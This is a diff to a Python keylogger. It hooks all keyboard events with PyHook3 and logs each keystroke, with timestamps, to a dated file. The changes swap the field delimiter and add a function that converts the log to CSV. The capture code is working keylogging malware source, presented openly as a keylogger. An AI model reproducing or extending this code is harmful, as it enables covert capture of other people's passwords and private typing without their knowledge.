@@ -10,13 +10,20 @@ datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the
 datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and time the keys were pressed
 
 
+def ConvertToTable():
+  with open(datelogname + 'logfile.txt', 'r') as infile, open('outfile.csv', 'w') as outfile:
+    for line in infile:
+      outfile.write(line.replace("|","|"))
+
+ConvertToTable()
+
 # Define a new function for the keylogger
 
 # sg.Popup('Hello from pysimple!', ' This is the shortest GUI program ever!')
 
 def GiveSpaceAtTheEnd():  # this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
     logfile = open(datelogname + "logfile.txt", 'a+')
-    logfile.write("\n" + datetimestamp + " || " ) # Adds a new line. Enters the current date and time next to it. Plus, it add's the Delimiter.
+    logfile.write("\n" + datetimestamp + " | " ) # Adds a new line. Enters the current date and time next to it. Plus, it add's the Delimiter.
     logfile.close() # closes the log file
 
 
@@ -36,7 +43,7 @@ def OnKeyboardEvent(event):
     # print("current window being typed in " + windowname)
 
     if event.Ascii == 13:  # if entered is pressed, then start a new line and add the current date and time next to it. Plus, add the Delimiter.
-        keylogs = '\n' + datetimestamp + " || " + " "
+        keylogs = '\n' + datetimestamp + " | "  + " "
 
     if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
         keylogs =' <Backspace> '
@@ -56,20 +63,22 @@ def OnKeyboardEvent(event):
 
     logfile.close()   # closes the file
 
-    logfile = open(datelogname + 'logfile.txt', 'r')
-    logfilelist = [line.split('||') for line in logfile.read()]
-
+    # logfile = open(datelogname + 'logfile.txt', 'r')
+    # logfilelist = [line.split('||') for line in logfile.read()]
+    ConvertToTable()
 
     return True
+
 
 
 hm = PyHook3.HookManager()
 hm.KeyDown = OnKeyboardEvent   # watch for all keyboard events
 hm.HookKeyboard()
+ConvertToTable()
+
 
 
 pythoncom.PumpMessages()
-
 
 
 
